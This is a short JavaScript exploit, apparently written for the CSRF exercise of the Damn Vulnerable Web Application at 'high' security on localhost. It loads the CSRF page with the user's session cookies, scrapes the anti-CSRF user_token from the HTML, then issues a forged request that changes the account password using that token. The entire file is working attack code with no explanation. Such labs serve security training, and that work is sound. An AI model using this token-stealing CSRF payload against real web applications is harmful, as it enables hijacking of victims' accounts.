var theUrl = 'http://localhost/vulnerabilities/csrf/';
var pass = 'high';

fetch(theUrl, {
    method: 'GET',
    credentials: 'include'
}).then(function(response) {
    return response.text();
}).then(function(text) {
    var parser = new DOMParser();
    var doc = parser.parseFromString(text, "text/html");
    var token = doc.getElementsByName('user_token')[0].value;
    console.log(token);
    new_url = theUrl + '?password_new=' + pass + '&password_conf=' + pass + '&Change=Change&user_token=' + token + '&Change=Change';
    fetch(new_url, {
        method: 'GET',
        credentials: 'include'
    }).then(function(response) {
        return response.text();
    }).then(function(text) {
        console.log(text);
    });
});
